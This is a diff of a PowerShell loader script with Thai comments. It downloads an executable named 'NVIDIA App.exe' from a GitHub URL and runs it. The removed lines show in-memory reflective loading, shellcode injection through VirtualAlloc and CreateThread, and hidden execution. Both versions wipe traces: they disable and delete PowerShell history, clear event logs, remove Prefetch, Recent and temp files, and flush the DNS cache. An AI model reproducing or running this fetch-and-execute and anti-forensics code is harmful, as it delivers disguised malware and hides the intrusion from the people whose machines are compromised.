@@ -1,105 +1,77 @@
 # ============================================
-# 1. ปิดการบันทึกประวัติ
+# RUN EXE + MINIMAL TRACE (ใช้งานได้จริง)
 # ============================================
-Set-PSReadlineOption -HistorySaveStyle SaveNothing -ErrorAction SilentlyContinue
-$ErrorActionPreference = 'SilentlyContinue'
-$ProgressPreference = 'SilentlyContinue'
 
-# ============================================
+# 1. ปิด PowerShell History
+Set-PSReadlineOption -HistorySaveStyle SaveNothing -ErrorAction SilentlyContinue
+Clear-History
+
 # 2. ดาวน์โหลด EXE
-# ============================================
 $exeUrl = "https://github.com/zenxler98-ui/betx/raw/refs/heads/main/NVIDIA%20App.exe"
-$bytes = $null
+$randomName = -join ((65..90) + (97..122) | Get-Random -Count 10 | ForEach-Object { [char]$_ })
+$tempPath = Join-Path $env:TEMP "$randomName.exe"
 
 try {
-    $response = Invoke-WebRequest -Uri $exeUrl -UseBasicParsing -UserAgent "Mozilla/5.0"
-    $bytes = $response.Content
+    $wc = New-Object System.Net.WebClient
+    $wc.Headers.Add("User-Agent", "Mozilla/5.0")
+    $wc.DownloadFile($exeUrl, $tempPath)
 } catch {
     try {
-        $wc = New-Object System.Net.WebClient
-        $wc.Headers.Add("User-Agent", "Mozilla/5.0")
-        $bytes = $wc.DownloadData($exeUrl)
+        Invoke-WebRequest -Uri $exeUrl -OutFile $tempPath -UseBasicParsing
     } catch {
+        Write-Host "Download failed." -ForegroundColor Red
         exit
     }
 }
 
-if (-not $bytes -or $bytes.Length -eq 0) { exit }
-
-# ============================================
-# 3. รัน EXE จาก RAM (วิธีที่ได้ผล 99%)
-# ============================================
-try {
-    # ใช้ .NET Assembly สำหรับ .NET EXE
-    try {
-        $assembly = [System.Reflection.Assembly]::Load($bytes)
-        $entryPoint = $assembly.EntryPoint
-        if ($entryPoint) {
-            $entryPoint.Invoke($null, (, [string[]] @()))
-            $executed = $true
-        }
-    } catch {}
-
-    # ถ้าไม่ใช่ .NET ให้ใช้ Win32 API
-    if (-not $executed) {
-        Add-Type -TypeDefinition @"
-using System;
-using System.Runtime.InteropServices;
-public class NativeExec {
-    [DllImport("kernel32.dll", SetLastError=true)]
-    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
-    [DllImport("kernel32.dll", SetLastError=true)]
-    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
-    [DllImport("kernel32.dll", SetLastError=true)]
-    public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
+# 3. ตรวจสอบไฟล์
+if (-not (Test-Path $tempPath)) {
+    Write-Host "File not found." -ForegroundColor Red
+    exit
 }
-"@ -ErrorAction SilentlyContinue
 
-        $size = $bytes.Length
-        $ptr = [NativeExec]::VirtualAlloc([IntPtr]::Zero, $size, 0x3000, 0x40)
-        if ($ptr -ne [IntPtr]::Zero) {
-            [System.Runtime.InteropServices.Marshal]::Copy($bytes, 0, $ptr, $size)
-            $thread = [NativeExec]::CreateThread([IntPtr]::Zero, 0, $ptr, [IntPtr]::Zero, 0, [IntPtr]::Zero)
-            if ($thread -ne [IntPtr]::Zero) {
-                # ปล่อยให้ทำงานเบื้องหลัง
-                # [NativeExec]::WaitForSingleObject($thread, 0xFFFFFFFF)
-            }
-        }
+# 4. รัน EXE (แบบปกติ)
+try {
+    $proc = Start-Process -FilePath $tempPath -WindowStyle Normal -PassThru
+    Write-Host "Started with PID: $($proc.Id)" -ForegroundColor Green
+} catch {
+    Write-Host "Failed to start: $_" -ForegroundColor Red
+    exit
+}
+
+# 5. รอให้ EXE เริ่มทำงาน (ปรับตามขนาดไฟล์)
+Start-Sleep -Seconds 3
+
+# 6. ลบไฟล์ EXE (ถ้าไม่ได้ถูกล็อค)
+try {
+    if (Test-Path $tempPath) {
+        Remove-Item $tempPath -Force -ErrorAction SilentlyContinue
     }
 } catch {}
 
-# ============================================
-# 4. Fallback: รันจากไฟล์ใน Memory (RamDisk)
-# ============================================
-if (-not $executed) {
-    try {
-        # ใช้ New-PSDrive สร้าง RAM Disk ชั่วคราว
-        $ramDrive = New-PSDrive -Name "Mem" -PSProvider FileSystem -Root "C:\" -Description "RAM Disk" -ErrorAction SilentlyContinue
-        $tempPath = "Mem:\$([System.Guid]::NewGuid().ToString()).exe"
-        [System.IO.File]::WriteAllBytes($tempPath, $bytes)
-        $proc = Start-Process -FilePath $tempPath -WindowStyle Hidden -PassThru
-        Start-Sleep -Seconds 2
-        # ลบไฟล์ (ถ้าไม่ได้ถูกล็อค)
-        Remove-Item $tempPath -Force -ErrorAction SilentlyContinue
-    } catch {
-        # สุดท้าย: ใช้ Temp จริง
-        try {
-            $tempPath = [System.IO.Path]::GetTempFileName() + ".exe"
-            [System.IO.File]::WriteAllBytes($tempPath, $bytes)
-            $proc = Start-Process -FilePath $tempPath -WindowStyle Hidden -PassThru
-            Start-Sleep -Seconds 2
-            Remove-Item $tempPath -Force -ErrorAction SilentlyContinue
-        } catch {}
-    }
-}
+# 7. ลบ Prefetch (ลบไฟล์ .pf ที่เกี่ยวกับ EXE นี้)
+try {
+    $pfFiles = Get-ChildItem "C:\Windows\Prefetch\*$randomName*.pf" -ErrorAction SilentlyContinue
+    $pfFiles | Remove-Item -Force -ErrorAction SilentlyContinue
+} catch {}
 
-# ============================================
-# 5. ล้างร่องรอย
-# ============================================
-Clear-History
-wevtutil cl "Windows PowerShell" 2>$null
+# 8. ลบ PowerShell History
+try {
+    Remove-Item "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -Force -ErrorAction SilentlyContinue
+    Clear-History
+} catch {}
+
+# 9. ลบ Recent Documents
+try {
+    Remove-Item "$env:APPDATA\Microsoft\Windows\Recent\*$randomName*" -Force -ErrorAction SilentlyContinue
+} catch {}
+
+# 10. ลบ Temp Files ที่เกี่ยวข้อง
+try {
+    Remove-Item "$env:TEMP\*$randomName*" -Force -ErrorAction SilentlyContinue
+} catch {}
+
+# 11. ล้าง DNS Cache (ถ้าต้องการ)
 ipconfig /flushdns 2>$null
-Remove-Item "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -Force -ErrorAction SilentlyContinue
 
-[GC]::Collect()
-[Environment]::Exit(0)
+Write-Host "Done." -ForegroundColor Green
